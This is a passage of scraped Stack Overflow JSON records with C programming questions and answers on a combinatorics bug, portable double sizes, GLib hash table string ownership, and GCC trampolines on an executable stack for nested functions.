an intermittent problem, perhaps on a distributed, networked system, that only shows up occasionally.  Then you need logging, and lots of it."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 2, "creation_date": 1459357321, "post_id": 36313891, "comment_id": 60253785, "body": "Are you aware that 20! is the largest factorial that can be stored in a 64-bit integer?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1459357636, "post_id": 36313891, "comment_id": 60253996, "body": "when compiling, always enable all the warnings, then fix those warnings.  (for <code>gcc</code>, at a minimum use: <code>-Wall -Wextra -pedantic</code>   I also use <code>-Wconversion -std=gnu99</code> )"}], "owner": {"reputation": 11, "user_id": 6135656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a15f98cf6d07ad168e4df88d091c3d04?s=128&d=identicon&r=PG&f=1", "display_name": "kidchicken", "link": "https://stackoverflow.com/users/6135656/kidchicken"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 76, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1459353484, "creation_date": 1459353211, "last_edit_date": 1459353484, "question_id": 36313891, "link": "https://stackoverflow.com/questions/36313891/computation-error-any-ideas", "title": "Computation error. Any ideas?", "body": "<p>I am having some trouble with one of my sample input values, everything else here is working correctly besides the last input.</p>\n\n<p>The problem is to find how many different combinations of $2,$5, and $10 bills can make up the value, here are the sample input and output numbers.</p>\n\n<p>Also in this problem, (2+5) and (5+2) are being treated as unique combinations.</p>\n\n<pre><code>1 - 0\n2 - 1\n7 - 2\n50 - 52524\n</code></pre>\n\n<p>I am getting the correct answer for everything else, but 52271 for 50, and can't seem to figure out why. Here is my code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n\nlong long permutate(long long bill);\nlong long calculatePossibleOrders(long long A, long long B, long long C);\nlong long factor(long long x);\n\nint main()\n{\n    long long num_cases, i;\n    /* code for grabbing c - number of cases to solve */\n    scanf(\"%I64d\", &amp;num_cases);\n\n    /* for loop for each case */\n    for(i = 0; i &lt; num_cases; i++)\n    {\n        long long bill = 0;\n        scanf(\"%I64d\", &amp;bill);\n        printf(\"%I64d\\n\", permutate(bill));\n    }\n} \n\nlong long permutate(long long bill)\n{\n    long long originalbill = bill;\n    long long CurrentBill = originalbill; \n    long long numberofOptions = 0;\n    long long A, B, C;\n\n\n    if(bill == 1 || bill == 3)\n    {\n        return 0;\n    }\n\n    for(A = 0; A &lt;= originalbill; A+=10)\n    {\n        B = 0, C = 0;\n        if((CurrentBill - A) == 0) \n        {\n            numberofOptions += calculatePossibleOrders(A, B, C); \n            break;\n        }\n        for(B = 0; (A + B) &lt;= CurrentBill; B+=5)\n        {\n            C = 0;\n            if((CurrentBill - (A + B)) == 0) \n            {\n                numberofOptions += calculatePossibleOrders(A, B, C); \n                break;\n            }\n            for(C = 0; (A+B+C) &lt;= CurrentBill; C+=2)\n            {\n                if((CurrentBill - (A + B + C)) == 0) \n                {   \n                    numberofOptions += calculatePossibleOrders(A, B, C); \n                    break;\n                }\n            }\n        }\n    }\n\n    return(numberofOptions);\n}\n\nlong long calculatePossibleOrders(long long A, long long B, long long C)\n{\n    long long combos = 0;\n    long long x = 0;\n\n    if(A &gt; 0)\n    {\n        A /= 10;\n    }\n    if(B &gt; 0)\n    {\n        B /= 5;\n    }\n    if(C &gt; 0)\n    {\n        C /= 2;\n    }\n\n\n    x = A+B+C;\n    combos = factor(x)/(factor(A)*factor(B)*factor(C));\n\n    return(combos);\n}\n\nlong long factor(long long x)\n{\n    long long i;\n    long long value = 1;\n    for(i = 1; i &lt;= x; i++)\n    {\n        value = value*i;\n    }\n    return(value);\n}\n</code></pre>\n"}, {"tags": ["c", "format", "standards"], "comments": [{"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459352538, "post_id": 36313474, "comment_id": 60250539, "body": "Can this even happen?  The FP instructions would fail, no?"}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459352678, "post_id": 36313474, "comment_id": 60250648, "body": "Owait - you compile it on a deprecated compiler for the ancient machines?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 6, "creation_date": 1459352717, "post_id": 36313474, "comment_id": 60250679, "body": "This is too vague.  Why does your program need 8 byte <code>double</code>?  Why can&#39;t it use a higher precision type? Why is the program dependent on a fixed size/format?  <i>Much</i> more is needed about how your code uses <code>double</code> to answer this."}, {"owner": {"reputation": 11698, "user_id": 5399734, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/2162d669508364bb0c03aba1a2473aa8?s=128&d=identicon&r=PG&f=1", "display_name": "nalzok", "link": "https://stackoverflow.com/users/5399734/nalzok"}, "edited": false, "score": 1, "creation_date": 1459353602, "post_id": 36313474, "comment_id": 60251328, "body": "Note that &quot;8 bytes long&quot; doesn&#39;t necessary mean &quot;64 bits long&quot;. You should also check <code>CHAR_BIT</code>"}, {"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1459354007, "post_id": 36313474, "comment_id": 60251613, "body": "64 bit long does not mean double precision, either, let alone IEEE754 double precision. Your code require something the target computer does not provide, solution is simple: 1) fix the code to remove such requirement; 2) use a different target computer; 3) write your own <code>double</code> ."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1459357174, "post_id": 36313474, "comment_id": 60253693, "body": "Note that <code>static_assert</code> in particular is new in C2011.  If you&#39;re targeting old machines, then you may well have to rely on old compilers that don&#39;t support it."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1459364754, "post_id": 36313474, "comment_id": 60258505, "body": "So your question might be &quot;If the machine I&#39;m using today doesn&#39;t support 8-byte IEEE doubles, how do I read my input?&quot;  Or it might be, &quot;If I&#39;m content to just read doubles using my machine&#39;s native format, how can I detect at build time and fail if the machine doesn&#39;t use 8-byte IEEE?&quot;  For the former, the answer would be &quot;write your own code to read IEEE 8-byte doubles &quot;by hand&quot; (which is an interesting problem).  For the latter, I don&#39;t know."}], "answers": [{"tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 0, "last_activity_date": 1459353228, "creation_date": 1459353228, "answer_id": 36313897, "question_id": 36313474, "link": "https://stackoverflow.com/questions/36313474/c-what-to-do-when-double-is-not-8-bytes-long/36313897#36313897", "title": "C - What to do when double is not 8 bytes long?", "body": "<p>If the reason you need 8-byte doubles is because you are reading and writing them to data files that way, you need to step back and have a long, hard think about this.  Reading and writing \"binary\" data files is one of those things people love to do because it's \"easy\" and \"efficient\" -- but of course it's wildly unportable.  You can try to patch things up to make your binary data files vaguely portable, but it's actually pretty difficult, and by the time you do, it's no longer easy or efficient.</p>\n\n<p>If you can possibly see your way clear to using text data files, just about all of your portability problems will magically vanish, and you won't have to worry about those data files any more.</p>\n\n<p>You can read and write floating-point quantities to text data files using <code>%a</code>, which will do a good job of preserving accuracy and precision.</p>\n"}, {"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1459356762, "creation_date": 1459356762, "answer_id": 36315071, "question_id": 36313474, "link": "https://stackoverflow.com/questions/36313474/c-what-to-do-when-double-is-not-8-bytes-long/36315071#36315071", "title": "C - What to do when double is not 8 bytes long?", "body": "<p>If you know the specific types of machines and C environment on which your code must run, then you can and should study their documentation to determine whether their characteristics match your data format.  If they do, then you have no problem.  If they don't, then you have to write FP emulation code.</p>\n\n<p>If you can't make this determination prior to writing the code, or if characteristics of the target machines vary in a way that makes a difference here, then you need to write the emulation code regardless.  Of course, you can use such code on any machine, so you might stop there.  You could also, however, provide an alternative code path that uses native FP, and choose between the two paths either at build time (via conditional compilation) or at run time (via an explicit test of FP representation).</p>\n"}], "owner": {"reputation": 1058, "user_id": 4710968, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/1f72a47abbae7cb93b1ec101e5b13276?s=128&d=identicon&r=PG&f=1", "display_name": "Charlestone", "link": "https://stackoverflow.com/users/4710968/charlestone"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 77, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1459356762, "creation_date": 1459352119, "last_edit_date": 1459354365, "question_id": 36313474, "link": "https://stackoverflow.com/questions/36313474/c-what-to-do-when-double-is-not-8-bytes-long", "title": "C - What to do when double is not 8 bytes long?", "body": "<p>I have a C program and I will use it on deprecated machines. I am a little bit scared of problems with basic types compatibilities - I mean, when I ask How can I guarantee, that double will be 8 bytes long? answer is </p>\n\n<p>\"You can put this in your code:</p>\n\n<pre><code>static_assert(sizeof(double) == 8, \"invalid double size\");\"\n</code></pre>\n\n<p>Ok, I get it...\nBut what do I do, when I run the code and it goes \"assertion failed\"?</p>\n\n<p>What are my options now? How can I deal with this problem? I need to run the program on that specific machine... Is it hard to adapt the program to different size of double?\nP.S. My program needs 8byte doubles</p>\n\n<p>EDIT: Why do I need 8 byte doubles?\nI read some data from serial port in binary format to a buffer and from that buffer I need to extract the IEEE754 double precision and single precision numbers, to do some calculations with them.</p>\n"}, {"tags": ["c"], "answers": [{"comments": [{"owner": {"reputation": 3, "user_id": 6130254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32ebeba6cf6bda77d84574a64cc9fdef?s=128&d=identicon&r=PG&f=1", "display_name": "merdan", "link": "https://stackoverflow.com/users/6130254/merdan"}, "edited": false, "score": 0, "creation_date": 1459426731, "post_id": 36317514, "comment_id": 60288420, "body": "thx a lot. I nearly found this out. thx for making my brain bright))"}], "tags": [], "owner": {"reputation": 32921, "user_id": 5771269, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/be6a5b618f5bd197150a6186318beba7?s=128&d=identicon&r=PG&f=1", "display_name": "cdlane", "link": "https://stackoverflow.com/users/5771269/cdlane"}, "is_accepted": true, "score": 1, "last_activity_date": 1459364591, "creation_date": 1459364591, "answer_id": 36317514, "question_id": 36313337, "link": "https://stackoverflow.com/questions/36313337/g-hash-table-contains-returns-unexpected-value/36317514#36317514", "title": "g_hash_table_contains returns unexpected value", "body": "<p>I believe when you pass your malloc'd string to a GHashTable under <code>g_str_hash</code>, you're turning over control of the string to the hash table -- it's up to it to free it when the time comes, etc.  I.e. you shouldn't use that space allocation again!</p>\n\n<p>Create a new string for your comparison:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;glib.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nGHashTable *hash = NULL;\n\nint check_sth_blacklist(char *sth)\n{\n    return g_hash_table_contains(hash, sth);\n}\n\nint main()\n{\n    hash = g_hash_table_new(g_str_hash, g_str_equal);\n\n    char *sth = (char*) malloc(32);\n\n    scanf(\"%s\", sth);\n    g_hash_table_add(hash, sth);\n\n    char *nth = (char*) malloc(32);\n    scanf(\"%s\", nth);\n\n    printf(\"%d\\n\", check_sth_blacklist(nth + 2));\n\n    free(nth);\n\n    g_hash_table_destroy(hash);\n\n    return 0;\n}\n</code></pre>\n\n<p>Let the hash manage any strings you put into it (key or value), all of which should be independent and freeable when the hash itself is destroyed.  When run, this gives me:</p>\n\n<pre><code>bash-3.2$ ./a.out\ncde\nabcde\n1\nbash-3.2$ \n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 6130254, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32ebeba6cf6bda77d84574a64cc9fdef?s=128&d=identicon&r=PG&f=1", "display_name": "merdan", "link": "https://stackoverflow.com/users/6130254/merdan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 121, "favorite_count": 0, "accepted_answer_id": 36317514, "answer_count": 1, "score": 0, "last_activity_date": 1459364591, "creation_date": 1459351820, "question_id": 36313337, "link": "https://stackoverflow.com/questions/36313337/g-hash-table-contains-returns-unexpected-value", "title": "g_hash_table_contains returns unexpected value", "body": "<p>I have a problem with this code. I can't get my expected answer. I searched for this, but I can't find anything. I can't find my mistake..</p>\n\n<p>Here is my code working with g_hash_table</p>\n\n<pre><code># include &lt;stdio.h&gt;\n# include &lt;glib.h&gt;\n# include &lt;stdlib.h&gt;\n\nGHashTable *hash = NULL;\n\nint check_sth_blacklist(char *sth)\n{   \n    return g_hash_table_contains(hash,sth);\n}\n\nmain()\n{\n    hash = g_hash_table_new(g_str_hash,g_str_equal);\n\n    char *sth = (char*) malloc(32);\n\n    scanf(\"%s\",sth);\n    g_hash_table_add(hash,sth);\n\n\n    scanf(\"%s\",sth);\n\n    printf(\"%d\\n\",check_sth_blacklist(sth + sizeof(char)*2));\n\n\n    free(sth);\n}\n</code></pre>\n\n<p>in my input I'm writing:</p>\n\n<pre><code>cde\nabcde\n</code></pre>\n\n<p>I think <code>cde</code> string will add to g_hash_table. then when I'm asking for string <code>cde</code> in <code>abcde</code> it returns me 0 value.</p>\n"}, {"tags": ["c", "linux", "gcc", "compilation", "stack"], "comments": [{"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1459351930, "post_id": 36313029, "comment_id": 60250039, "body": "What makes you say gcc does this?"}, {"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "reply_to_user": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1459351969, "post_id": 36313029, "comment_id": 60250080, "body": "Because I read the assembly created by gcc. I created the assembly and read it."}, {"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 1, "creation_date": 1459352084, "post_id": 36313029, "comment_id": 60250167, "body": "Can you show this assembly code?"}, {"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1459352406, "post_id": 36313029, "comment_id": 60250441, "body": "That&#39;s how the <i>pointer to the code</i> gets on the stack; the <i>code</i> for that function is not."}, {"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "reply_to_user": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1459353142, "post_id": 36313029, "comment_id": 60250994, "body": "No, I know the difference between pointer and code itself. The stack contains code itself. Maybe I made a typo. return function as an object. and you will see code on the stack(not all the function code but some code)."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 2, "creation_date": 1459353323, "post_id": 36313029, "comment_id": 60251122, "body": "You would need to provide an example of that."}, {"owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "edited": false, "score": 0, "creation_date": 1459353938, "post_id": 36313029, "comment_id": 60251554, "body": "Functions aren&#39;t objects in C; if you have evidence to the contrary, please show it."}, {"owner": {"reputation": 23582, "user_id": 758133, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/W8X5E.jpg?s=128&g=1", "display_name": "Martin James", "link": "https://stackoverflow.com/users/758133/martin-james"}, "edited": false, "score": 0, "creation_date": 1459354415, "post_id": 36313029, "comment_id": 60251880, "body": "I can understand code being copied to a stack - the stack is writeable, so it could happen: a bug could do it, and I would expect a segfault/AV to follow on shortly....."}, {"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "edited": false, "score": 0, "creation_date": 1459355357, "post_id": 36313029, "comment_id": 60252448, "body": "The entire function code is not copied. When we call a function we need to provide environment pointer along with params &amp; return address. So what happens is it creates two intruction on stack one is to jump to the code and other is to load environment pointer. and returns a pointer to it. So when a call to returned function is made from main it actually executes the code from stack to jump to actual function code. By environment pointer I mean static link."}, {"owner": {"reputation": 538, "user_id": 1665886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e1ddc9e7284c08982437f63fcf0e2d?s=128&d=identicon&r=PG", "display_name": "CarlH", "link": "https://stackoverflow.com/users/1665886/carlh"}, "edited": false, "score": 1, "creation_date": 1459357188, "post_id": 36313029, "comment_id": 60253704, "body": "Sounds like a thunk.  Would like to see the <i>examples</i> !!!"}, {"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "edited": false, "score": 0, "creation_date": 1459411735, "post_id": 36313029, "comment_id": 60277682, "body": "I have added an example in the question description."}, {"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 0, "creation_date": 1459412710, "post_id": 36313029, "comment_id": 60278268, "body": "Please 1) remove any unnecessary C code from your example, 2) fix the various compiler warnings (unused variables, missing return types / values), 3) add the <i>specific</i> command line you are using to compile / disassemble the code. I was not able to reproduce your results."}, {"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "edited": false, "score": 0, "creation_date": 1459421578, "post_id": 36313029, "comment_id": 60284606, "body": "Removed unnecessary code."}], "answers": [{"tags": [], "owner": {"reputation": 44000, "user_id": 535275, "user_type": "registered", "accept_rate": 91, "profile_image": "https://i.stack.imgur.com/Ft2Mw.jpg?s=128&g=1", "display_name": "Scott Hunter", "link": "https://stackoverflow.com/users/535275/scott-hunter"}, "is_accepted": false, "score": 1, "last_activity_date": 1459351561, "creation_date": 1459351561, "answer_id": 36313235, "question_id": 36313029, "link": "https://stackoverflow.com/questions/36313029/execution-of-code-on-the-stack/36313235#36313235", "title": "Execution of code on the stack", "body": "<p>You would allocate memory from heap as opposed to the stack.  But that might not do the trick, either, as modern processors/OSes allow for distinguishing between memory regions containing code and those containing data (for obvious security reasons).</p>\n"}, {"comments": [{"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "edited": false, "score": 0, "creation_date": 1459353264, "post_id": 36313610, "comment_id": 60251079, "body": "The stack holds some code not the all function code but some code. for jumping and setting static link etc. but the code is there on stack."}, {"owner": {"reputation": 538, "user_id": 1665886, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17e1ddc9e7284c08982437f63fcf0e2d?s=128&d=identicon&r=PG", "display_name": "CarlH", "link": "https://stackoverflow.com/users/1665886/carlh"}, "edited": false, "score": 0, "creation_date": 1459357600, "post_id": 36313610, "comment_id": 60253971, "body": "Maybe this link will help: <a href=\"http://hokstad.com/how-to-implement-closures\" rel=\"nofollow noreferrer\">hokstad.com/how-to-implement-closures</a>"}], "tags": [], "owner": {"reputation": 244, "user_id": 6134918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4dd3c3e4c2313fe66cc45a8b1e5c8e96?s=128&d=identicon&r=PG&f=1", "display_name": "Hugo", "link": "https://stackoverflow.com/users/6134918/hugo"}, "is_accepted": false, "score": 0, "last_activity_date": 1459352412, "last_edit_date": 1495541260, "creation_date": 1459352412, "answer_id": 36313610, "question_id": 36313029, "link": "https://stackoverflow.com/questions/36313029/execution-of-code-on-the-stack/36313610#36313610", "title": "Execution of code on the stack", "body": "<p>I suppose you assume that the stack is holding the code itself. That may not be the case. Stack is just a holder for the pointer to the code area. </p>\n\n<p>You can learn more on how stack works <a href=\"https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Mips/stack.html\" rel=\"nofollow noreferrer\">here</a></p>\n\n<p><a href=\"https://stackoverflow.com/a/18283676/6134918\">This SO answer</a> shows that the function pointer or the function itself would need the code location</p>\n"}, {"comments": [{"owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "edited": false, "score": 0, "creation_date": 1459526024, "post_id": 36359958, "comment_id": 60340780, "body": "Thanks a lot for the answer :)"}], "tags": [], "owner": {"reputation": 2915, "user_id": 5136580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/42efea573d72921a6de90bef052c4879?s=128&d=identicon&r=PG&f=1", "display_name": "Mikel Rychliski", "link": "https://stackoverflow.com/users/5136580/mikel-rychliski"}, "is_accepted": true, "score": 1, "last_activity_date": 1459526991, "last_edit_date": 1459526991, "creation_date": 1459523849, "answer_id": 36359958, "question_id": 36313029, "link": "https://stackoverflow.com/questions/36313029/execution-of-code-on-the-stack/36359958#36359958", "title": "Execution of code on the stack", "body": "<p>Your C code contains a nested function, so GCC will set the <code>.note.GNU-stack</code> section of the generated object file to <code>x</code> (indicating an executable stack is required).</p>\n\n<p>When the linker is invoked, it checks all supplied object files for this section. Because one of the input files has <code>.note.GNU-stack</code> set to <code>x</code>, the linker knows the stack must be executable.</p>\n\n<p>To indicate this, the ELF header <code>GNU_STACK</code> in the final executable has the flag <code>PF_X</code> added to it.</p>\n\n<p>The command:</p>\n\n<pre><code>readelf -l a.out | grep -A1 GNU_STACK\n</code></pre>\n\n<p>Should allow you to see the <code>RWE</code> flag set instead of <code>RW</code>.</p>\n\n<p>The kernel specifically looks for this header when setting up the memory map for the process.</p>\n\n<p>More details in the <a href=\"https://sourceware.org/ml/binutils/2003-05/msg00741.html\" rel=\"nofollow\">original patch</a></p>\n"}], "owner": {"reputation": 51, "user_id": 5647892, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-1c1WYyCb2oI/AAAAAAAAAAI/AAAAAAAAABM/AwK6hsfQjKA/photo.jpg?sz=128", "display_name": "Akash Garg", "link": "https://stackoverflow.com/users/5647892/akash-garg"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 173, "favorite_count": 0, "closed_date": 1460075112, "accepted_answer_id": 36359958, "answer_count": 3, "score": -1, "last_activity_date": 1460619715, "creation_date": 1459351019, "last_edit_date": 1460619715, "question_id": 36313029, "link": "https://stackoverflow.com/questions/36313029/execution-of-code-on-the-stack", "closed_reason": "Needs details or clarity", "title": "Execution of code on the stack", "body": "<p>I am new to basics of gcc compilation. As far as I know the stack is inexecutable for security reasons. Then how can we have code on stack and execute. I observed this in case of a function returning pointer to a function. it does not return pointer to code but rather to a location on stack which has the code to be executed. How is that allowed in linux?</p>\n\n<p>It is already done by gcc. I want to know how is it even possible?</p>\n\n<p>Here is the c code:</p>\n\n<pre><code>     #include&lt;stdio.h&gt;\n\n    typedef int (* funcptr) ();\n\n\nfuncptr f ()\n{\n\n  int g ()\n  {\n\n}\nreturn (&amp;g);\n}\n\n\nmain ()\n{\n  funcptr fp;\n  fp = f();\n\n  fp ();\n\n }\n</code></pre>\n\n<p>And here is the portion of the assembly code geerating code on the stack:</p>\n\n<pre><code>    #Starting trampoline code. The trampoline code is a small\n    #piece of code set up inside the stack!!!. This code, when\n    #executed, loads ecx with the static link and calls the\n    #function g\n        movb    $-71, (%eax)    # This is B9, the opcode for\n                                  \"movl address_in_next_loc ecx\"\n                                  this, when executed, will\n                                  load the static link in ecx\n\n        movl    %edx, 1(%eax)   # address_in_next_loc=ebp-16\n                                  the static link effectively\n\n        movb    $-23, 5(%eax)   # This is E9. the opcode for\n                                  jmp addr_nxt_ins + offset_\n                                  in_nxt_loc\n                                  Since the offset_in_nxt_loc \n                                  is &amp;g - addr_nxt_ins, this\n                                  results in a jump to &amp;g\n\n        movl    $g.1831, %ecx   # Stores &amp;g - addr_nxt_ins\n        leal    10(%eax), %edx  #\n        subl    %edx, %ecx  # \n        movl    %ecx, %edx  # \n        movl    %edx, 6(%eax)   # \n    #End of trampoline code\n</code></pre>\n"}, {"tags": ["c", "linker", "iar", "dead-code"], "comments": [{"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459410919, "post_id": 36313006, "comment_id": 60277178, "body": "How are you planning to unit test functions that are never called"}, {"owner": {"reputation": 2815, "user_id": 4350586, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/IvPNx.png?s=128&g=1", "display_name": "Dmitry Grigoryev", "link": "https://stackoverflow.com/users/4350586/dmitry-grigoryev"}, "reply_to_user": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 0, "creation_date": 1459411173, "post_id": 36313006, "comment_id": 60277327, "body": "@M.M by creating a stack frame and placing the entry point address into program counter."}, {"owner": {"reputation": 2815, "user_id": 4350586, "user_type": "registered", "accept_rate": 93, "profile_image": 